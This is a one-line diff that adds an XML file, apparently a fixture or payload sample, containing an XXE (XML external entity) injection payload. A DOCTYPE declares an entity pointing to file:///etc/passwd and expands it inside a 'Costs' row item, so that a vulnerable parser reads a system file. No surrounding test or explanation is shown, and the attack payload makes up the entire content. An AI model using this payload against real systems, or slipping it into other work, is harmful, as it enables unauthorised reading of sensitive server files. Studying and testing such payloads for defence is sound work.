@@ -1,0 +1,1 @@
+<?xml version="1.0"?><!DOCTYPE Costs [<!ENTITY xxe SYSTEM "file:///etc/passwd">]><Costs><Row><Item>&xxe;</Item></Row></Costs>
